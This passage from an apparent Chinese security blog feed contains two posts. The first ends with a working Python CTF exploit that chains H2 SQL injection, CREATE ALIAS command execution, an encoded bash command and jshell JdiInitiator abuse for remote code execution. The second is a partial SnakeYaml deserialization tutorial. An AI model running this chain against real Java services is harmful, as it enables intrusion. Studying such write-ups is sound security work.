class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line">  </span><br><span class="line">base_url = <span class="string">&quot;http://localhost:1337&quot;</span>  </span><br><span class="line">  </span><br><span class="line">leak_sess_id = <span class="string">&quot;a&quot;</span>  </span><br><span class="line">cmd = <span class="string">&quot;/flag&quot;</span>  </span><br><span class="line">  </span><br><span class="line">sess = requests.Session()  </span><br><span class="line">  </span><br><span class="line">sessionId = sess.post(  </span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/login&quot;</span>, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;guest&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;guest&quot;</span>&#125;  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line">p = <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">\\&quot; and function(&#x27;CSVWRITE&#x27;,&#x27;/tmp/kek&#x27;,&#x27;select 1;CREATE ALIAS SHELLEXEC AS &#x27;&#x27;void leak(String sessId, String cmd) throws java.lang.Exception &#123;sekai.HibernateUtil.addSession(new sekai.Session(sekai.HibernateUtil.addUser(new sekai.User(new java.lang.String(new java.lang.ProcessBuilder(cmd).start().getInputStream().readAllBytes()).concat(new java.lang.String(new byte[]&#123;39, 124, 124, 34&#125;)), cmd)), sessId));&#125;//&#x27;&#x27;; CALL SHELLEXEC(&#x27;&#x27;%s&#x27;&#x27;, &#x27;&#x27;%s&#x27;&#x27;)&#x27;,&#x27;charset=UTF-8&#x27;)=\\&quot;  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(  </span><br><span class="line">    <span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>  </span><br><span class="line">) % (  </span><br><span class="line">    leak_sess_id,  </span><br><span class="line">    cmd,  </span><br><span class="line">)  </span><br><span class="line"><span class="built_in">print</span>(p)  </span><br><span class="line">cmd = <span class="string">f&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">wget --header=&#x27;Content-Type: application/x-www-form-urlencoded&#x27; --post-data &quot;username=u&amp;password=<span class="subst">&#123;p&#125;</span>&quot; http://127.0.0.1:8000/login  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.strip()  </span><br><span class="line"><span class="built_in">print</span>(cmd)  </span><br><span class="line">cmd = (  </span><br><span class="line">    <span class="string">&quot;/bin/bash -c &#123;echo,&quot;</span>  </span><br><span class="line">    + base64.b64encode(cmd.encode()).decode()  </span><br><span class="line">    + <span class="string">&quot;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line">constr_bytes = <span class="string">&quot;/**/,&quot;</span>.join(  </span><br><span class="line">    <span class="string">&quot;,&quot;</span>.join(<span class="built_in">str</span>(<span class="built_in">ord</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> cmd[i : i + <span class="number">60</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cmd), <span class="number">60</span>)  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line">java_code = (  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;  </span></span><br><span class="line"><span class="string">Runtime.getRuntime().exec(new String(new byte[]&#123;%s&#125;));  </span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line">    % constr_bytes  </span><br><span class="line">)  </span><br><span class="line">  </span><br><span class="line">col = <span class="string">f&#x27;new jdk.jshell.execution.JdiInitiator(0, new java.util.ArrayList(0), &quot;jdk/tools/jlink/internal/Main --save-opts /tmp/lol&quot;, true, &quot;localhost&quot;, 3000000, new map(&quot;jdk/tools/jlink/internal/Main --output /tmp/ab --add-modules java.base -p \\&quot;\\n<span class="subst">&#123;java_code&#125;</span>\\&quot; --save-opts /tmp/lol&quot; as main, &quot;n,server=y,suspend=n,address=localhost:13370&quot; as includevirtualthreads))&#x27;</span>  </span><br><span class="line">  </span><br><span class="line">col = <span class="string">f&quot;<span class="subst">&#123;col&#125;</span> union select <span class="subst">&#123;col&#125;</span> &quot;</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>(<span class="params">sessionId, fields</span>):  </span><br><span class="line">    <span class="keyword">return</span> sess.post(  </span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/orders&quot;</span>,  </span><br><span class="line">        data=&#123;<span class="string">&quot;sessionId&quot;</span>: sessionId, <span class="string">&quot;fields&quot;</span>: fields&#125;,  </span><br><span class="line">        headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;,  </span><br><span class="line">    )  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">order(sessionId=sessionId, fields=col)  </span><br><span class="line">  </span><br><span class="line">col = <span class="string">f&#x27;new jdk.jshell.execution.JdiInitiator(0, new java.util.ArrayList(0), &quot;jdk/internal/jshell/tool/JShellToolProvider /tmp/lol&quot;, true, &quot;localhost&quot;, 3000000, new map(&quot;n,server=y,suspend=n,address=localhost:13370&quot; as includevirtualthreads))&#x27;</span>  </span><br><span class="line">  </span><br><span class="line">col = <span class="string">f&quot;<span class="subst">&#123;col&#125;</span> union select <span class="subst">&#123;col&#125;</span> &quot;</span>  </span><br><span class="line">  </span><br><span class="line">order(sessionId=sessionId, fields=col)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(order(sessionId=leak_sess_id, fields=<span class="string">&quot;1||&#x27;&quot;</span>).text)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># wget --header=&#x27;Content-Type: application/x-www-form-urlencoded&#x27; --post-data &quot;username=u&amp;password=\&quot; and function(&#x27;CSVWRITE&#x27;,&#x27;/tmp/kek&#x27;,&#x27;select 1;CREATE ALIAS SHELLEXEC AS &#x27;&#x27;void leak(String sessId, String cmd) throws java.lang.Exception &#123;sekai.HibernateUtil.addSession(new sekai.Session(sekai.HibernateUtil.addUser(new sekai.User(new java.lang.String(new java.lang.ProcessBuilder(cmd).start().getInputStream().readAllBytes()).concat(new java.lang.String(new byte[]&#123;39, 124, 124, 34&#125;)), cmd)), sessId));&#125;//&#x27;&#x27;; CALL SHELLEXEC(&#x27;&#x27;a&#x27;&#x27;, &#x27;&#x27;/flag&#x27;&#x27;)&#x27;,&#x27;charset=UTF-8&#x27;)=\&quot;&quot; http://127.0.0.1:8000/login</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JDI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SnakeYaml反序列化</title>
      <link href="/2025/09/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/09/10/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="SnakeYaml反序列化"><a href="#SnakeYaml反序列化" class="headerlink" title="SnakeYaml反序列化"></a>SnakeYaml反序列化</h1><h2 id="Yaml规范"><a href="#Yaml规范" class="headerlink" title="Yaml规范"></a>Yaml规范</h2><h3 id="yaml对象"><a href="#yaml对象" class="headerlink" title="yaml对象"></a>yaml对象</h3><p>对象键值对使用冒号结构表示 key: value，冒号后面要加一个空格。</p><p>也可以使用 key:{key1: value1, key2: value2, …}</p><p>还可以使用缩进表示层级关系:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">key:</span> </span><br><span class="line">    <span class="attr">child-key:</span> <span class="string">value</span></span><br><span class="line">    <span class="attr">child-key2:</span> <span class="string">value2</span></span><br></pre></td></tr></table></figure><h3 id="yaml数组"><a href="#yaml数组" class="headerlink" title="yaml数组"></a>yaml数组</h3><p>以 - 开头的行表示构成一个数组：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">A</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">B</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">C</span></span><br></pre></td></tr></table></figure><p>一个相对复杂的例子：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">companies:</span></span><br><span class="line">    <span class="bullet">-</span></span><br><span class="line">        <span class="attr">id:</span> <span class="number">1</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">company1</span></span><br><span class="line">        <span class="attr">price:</span> <span class="string">200W</span></span><br><span class="line">    <span class="bullet">-</span></span><br><span class="line">        <span class="attr">id:</span> <span class="number">2</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">company2</span></span><br><span class="line">        <span class="attr">price:</span> <span class="string">500W</span></span><br></pre></td></tr></table></figure><p>上面的例子中, companies是一个数组, 它有两个元素, 每个元素又有三个属性</p><p>数组也可以使用流式(flow)的方式表示：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">companies:</span> [&#123;<span class="attr">id:</span> <span class="number">1</span>,<span class="attr">name:</span> <span class="string">company1</span>,<span class="attr">price:</span> <span class="string">200W</span>&#125;,&#123;<span class="attr">id:</span> <span class="number">2</span>,<span class="attr">name:</span> <span class="string">company2</span>,<span class="attr">price:</span> <span class="string">500W</span>&#125;]</span><br></pre></td></tr></table></figure><p>这样看起来更直观</p><h3 id="复合结构"><a href="#复合结构" class="headerlink" title="复合结构"></a>复合结构</h3><p>数组和对象可以构成复合结构，例：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">languages:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Ruby</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Perl</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">Python</span> </span><br><span class="line"><span class="attr">websites:</span></span><br><span class="line">  <span class="attr">YAML:</span> <span class="string">yaml.org</span> </span><br><span class="line">  <span class="attr">Ruby:</span> <span class="string">ruby-lang.org</span> </span><br><span class="line">  <span class="attr">Python:</span> <span class="string">python.org</span> </span><br><span class="line">  <span class="attr">Perl:</span> <span class="string">use.perl.org</span></span><br></pre></td></tr></table></figure><h3 id="纯量"><a href="#纯量" class="headerlink" title="纯量"></a>纯量</h3><p>纯量是最基本的，不可再分的值，包括：</p><ul><li>字符串</li><li>布尔值</li><li>整数</li><li>浮点数</li><li>Null</li><li>时间</li><li>日期<br>例子:<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">boolean:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="literal">TRUE</span>  <span class="comment">#true,True都可以</span></span><br><span class="line">    <span class="bullet">-</span> <span class="literal">FALSE</span>  <span class="comment">#false，False都可以</span></span><br><span class="line"><span class="attr">float:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">3.14</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">6.8523015e+5</span>  <span class="comment">#可以使用科学计数法</span></span><br><span class="line"><span class="attr">int:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">123</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">0b1010_0111_0100_1010_1110</span>    <span class="comment">#二进制表示</span></span><br><span class="line"><span class="attr">null:</span></span><br><span class="line">    <span class="attr">nodeName:</span> <span class="string">&#x27;node&#x27;</span></span><br><span class="line">    <span class="attr">parent:</span> <span class="string">~</span>  <span class="comment">#使用~表示null</span></span><br><span class="line"><span class="attr">string:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">哈哈</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">&#x27;Hello world&#x27;</span>  <span class="comment">#可以使用双引号或者单引号包裹特殊字符</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">newline</span></span><br><span class="line">      <span class="string">newline2</span>    <span class="comment">#字符串可以拆成多行，每一行会被转化成一个空格</span></span><br><span class="line"><span class="attr">date:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="number">2018-02-17</span>    <span class="comment">#日期必须使用ISO 8601格式，即yyyy-MM-dd</span></span><br><span class="line"><span class="attr">datetime:</span> </span><br><span class="line">    <span class="bullet">-</span>  <span class="number">2018-02-17T15:02:31+08:00</span>    <span class="comment">#时间使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>&amp; 锚点和 * 别名，可以用来引用：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">defaults:</span> <span class="meta">&amp;defaults</span></span><br><span class="line">  <span class="attr">adapter:</span>  <span class="string">postgres</span></span><br><span class="line">  <span class="attr">host:</span>     <span class="string">localhost</span></span><br><span class="line"></span><br><span class="line"><span class="attr">development:</span></span><br><span class="line">  <span class="attr">database:</span> <span class="string">myapp_development</span></span><br><span class="line">  <span class="string">&lt;&lt;:</span> <span class="meta">*defaults</span></span><br><span class="line"></span><br><span class="line"><span class="attr">test:</span></span><br><span class="line">  <span class="attr">database:</span> <span class="string">myapp_test</span></span><br><span class="line">  <span class="string">&lt;&lt;:</span> <span class="meta">*defaults</span></span><br></pre></td></tr></table></figure><p>&amp; 用来建立锚点（defaults），&lt;&lt; 表示合并到当前数据，* 用来引用锚点。</p><p>上面的例子相当于</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">defaults:</span></span><br><span class="line">  <span class="attr">adapter:</span>  <span class="string">postgres</span></span><br><span class="line">  <span class="attr">host:</span>     <span class="string">localhost</span></span><br><span class="line"></span><br><span class="line"><span class="attr">development:</span></span><br><span class="line">  <span class="attr">database:</span> <span class="string">myapp_development</span></span><br><span class="line">  <span class="attr">adapter:</span>  <span class="string">postgres</span></span><br><span class="line">  <span class="attr">host:</span>     <span class="string">localhost</span></span><br><span class="line"></span><br><span class="line"><span class="attr">test:</span></span><br><span class="line">  <span class="attr">database:</span> <span class="string">myapp_test</span></span><br><span class="line">  <span class="attr">adapter:</span>  <span class="string">postgres</span></span><br><span class="line">  <span class="attr">host:</span>     <span class="string">localhost</span></span><br></pre></td></tr></table></figure><p>参考链接：</p><p><a href="https://www.runoob.com/w3cnote/yaml-intro.html">https://www.runoob.com/w3cnote/yaml-intro.html</a></p><h2 id="SnakeYaml库使用"><a href="#SnakeYaml库使用" class="headerlink" title="SnakeYaml库使用"></a>SnakeYaml库使用</h2><ul><li>Yaml.load():将yaml数据反序列化成一个Java对象</li><li>Yaml.dump():将Java对象序列化成yaml</li></ul><p>导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>被序列化的类<br>Person.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.unserial;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String username;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span> &#123;&#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String username, <span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.username = username;  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge方法调用&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getUsername方法调用&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> username;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setAge方法调用&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.age = age;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setUsername方法调用&quot;</span>);  </span><br><span class="line">        <span class="built_in">this</span>.username = username;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>demo 测试序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.unserial;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testYaml</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">20</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> yaml.dump(person);  </span><br><span class="line">        System.out.println(str);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getAge方法调用</span><br><span class="line">getUsername方法调用</span><br><span class="line">!!org.n4c1.unserial.Person &#123;age: <span class="number">20</span>, username: n4c1&#125;</span><br></pre></td></tr></table></figure><p>demo 测试反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.n4c1.unserial;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> org.yaml.snakeyaml.Yaml;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testYaml</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">Yaml</span> <span class="variable">yaml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Yaml</span>();  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">20</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> yaml.dump(person);  </span><br><span class="line">        System.out.println(str);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">yamlStr</span> <span class="operator">=</span> <span class="string">&quot;!!org.n4c1.unserial.Person &#123;age: 20, username: n4c1&#125;&quot;</span>;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">person2</span> <span class="operator">=</span> (Person) yaml.load(yamlStr);  </span><br><span class="line">        System.out.println(person2.getUsername());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">getAge方法调用</span><br><span class="line">getUsername方法调用</span><br><span class="line">!!org.n4c1.unserial.Person &#123;age: <span class="number">20</span>, username: n4c1&#125;</span><br><span class="line"></span><br><span class="line">setAge方法调用</span><br><span class="line">setUsername方法调用</span><br><span class="line">getUsername方法调用</span><br><span class="line">n4c1</span><br></pre></td></tr></table></figure><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>snakeYaml的解析可以说是以节点为基础<br>假如有以下yaml文档</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">person:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">&quot;张三&quot;</span></span><br><span class="line">  <span class="attr">age:</span> <span class="number">30</span></span><br><span class="line">  <span class="attr">hobbies:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">读书</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">健身</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">编程</span></span><br></pre></td></tr></table></figure><p>词法分析器会逐个token解析出各个节点, 拆分出来各个节点对应:</p><ul><li><p><strong>整个文档的根节点</strong></p><ul><li><p><strong>节点类型</strong>: **映射 (Mapping)**。</p></li><li><p><strong>代表</strong>: 整个文档的顶层结构。</p></li><li><p><strong>说明</strong>: 这个节点包含一个键值对，键是 <code>person</code>，值是它下面的整个结构。</p></li></ul></li><li><p><strong><code>name</code> 节点</strong></p><ul><li><p><strong>节点类型</strong>: **标量 (Scalar)**。</p></li><li><p><strong>代表</strong>: 一个单一的值。</p></li><li><p><strong>说明</strong>: 这是一个键值对中的 <strong>值</strong>，其值为 <code>&quot;张三&quot;</code>。它是一个字符串。</p></li></ul></li><li><p><strong><code>age</code> 节点</strong></p><ul><li><p><strong>节点类型</strong>: **标量 (Scalar)**。</p></li><li><p><strong>代表</strong>: 一个单一的值。</p></li><li><p><strong>说明</strong>: 它的值为 <code>30</code>，一个整数。</p></li></ul></li><li><p><strong><code>hobbies</code> 节点</strong></p><ul><li><p><strong>节点类型</strong>: **序列 (Sequence)**。</p></li><li><p><strong>代表</strong>: 一个有序的列表。</p></li><li><p><strong>说明</strong>: 它的值是下面的三个项目，它包含了三个子节点。</p></li></ul></li><li><p><strong><code>hobbies</code> 下的子节点</strong></p><ul><li><p><strong>节点类型</strong>: **标量 (Scalar)**。</p></li><li><p><strong>代表</strong>: 序列中的每一个项。</p></li><li><p><strong>说明</strong>: 这三个节点分别是 <code>&quot;读书&quot;</code>、<code>&quot;健身&quot;</code> 和 <code>&quot;编程&quot;</code>，它们都是独立的字符串标量。</p></li></ul></li></ul><p>当反序列化我们的字符串时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">yamlStr</span> <span class="operator">=</span> <span class="string">&quot;!!org.n4c1.unserial.Person &#123;age: 20, username: n4c1&#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>根节点就是org.n4c1.unserial.Person它的值就是花括号中代表的内容, 其中又有age节点和username节点</p><p>再load方法打上断点分析</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808230109.png" alt="image.png"><br>跟进到loadFromReader方法</p><p>它会实例化了一个composer, 并放在constructor中, 通过constructor来构建对象</p><blockquote><p><code>Composer</code> 是 SnakeYAML 的核心组件之一，它的职责是将 YAML 事件流（由 <code>Parser</code> 生成）合成为一个单一的、完整的 YAML 节点图（node graph）。</p></blockquote><blockquote><p><strong>Construct</strong>会根据这些节点的类型和内容，把它们组装成一个你想要的 <strong>Java 对象</strong>。比如，它会把一个 <strong>映射节点</strong> 变成一个 Java <code>Map</code> 对象，或者一个自定义的类对象</p></blockquote><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808230920.png" alt="image.png"></p><p>在getSingleData方法中可以看见首先由composer获取了一个MappingNode, 描述的是该yaml文档的整体结构(node graph)<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808230739.png" alt="image.png"></p><p>constructDocument根据文档结构, 还原对象<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808231407.png" alt="image.png"></p><p>这里constructedObjects应该是类似缓存, 先从这里获取, 如果没有则创建<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808231459.png" alt="image.png"><br>跟进constructObjectNoCheck<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250808232131.png" alt="image.png"></p><p>获取构造器<br><img 